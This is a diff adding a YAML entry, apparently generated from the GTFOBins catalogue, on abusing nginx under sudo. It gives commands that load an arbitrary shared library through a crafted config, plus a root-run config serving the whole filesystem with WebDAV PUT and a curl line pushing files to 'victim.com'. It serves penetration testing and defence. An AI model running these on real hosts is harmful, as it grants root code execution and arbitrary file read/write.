@@ -1,0 +1,117 @@
+id: gtfobins/nginx/library-load/sudo
+type: binary
+platform: linux
+name: nginx
+phases:
+- execution
+- persistence
+- privilege-escalation
+capabilities:
+- library-load
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: 'cat >/path/to/temp-file <<EOF
+
+    load_module /path/to/lib.so;
+
+    EOF
+
+
+    nginx -t -c /path/to/temp-file'
+  comment: Alternatively, the `ssl_engine` directive can be used.
+references:
+- https://gtfobins.github.io/gtfobins/nginx/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        nginx:
+          functions:
+            download:
+            - code: "cat >/path/to/temp-file <<EOF\nuser root;\nhttp {\n  server {\n    listen 80;\n \
+                \   root /;\n    autoindex on;\n    dav_methods PUT;\n  }\n}\nevents {}\nEOF\n\nnginx\
+                \ -c /path/to/temp-file"
+              contexts:
+                sudo: null
+              sender:
+                code: curl -X PUT victim.com/path/to/output-file --data-binary @/path/to/input-file
+                comment: An HTTP client can be used on the attacker box to send the data.
+            library-load:
+            - code: 'cat >/path/to/temp-file <<EOF
+
+                load_module /path/to/lib.so;
+
+                EOF
+
+
+                nginx -t -c /path/to/temp-file'
+              comment: Alternatively, the `ssl_engine` directive can be used.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            upload:
+            - code: "cat >/path/to/temp-file <<EOF\nuser root;\nhttp {\n  server {\n    listen 80;\n \
+                \   root /;\n    autoindex on;\n    dav_methods PUT;\n  }\n}\nevents {}\nEOF\n\nnginx\
+                \ -c /path/to/temp-file"
+              contexts:
+                sudo: null
+              receiver: http-client
+    upstream_url: https://gtfobins.github.io/gtfobins/nginx/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: library-load
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: persistence
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: sudo
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:80d3cd35a2f2c447b136e4177ba15118e0db8e05560b43bfe732afafc4a31d4c
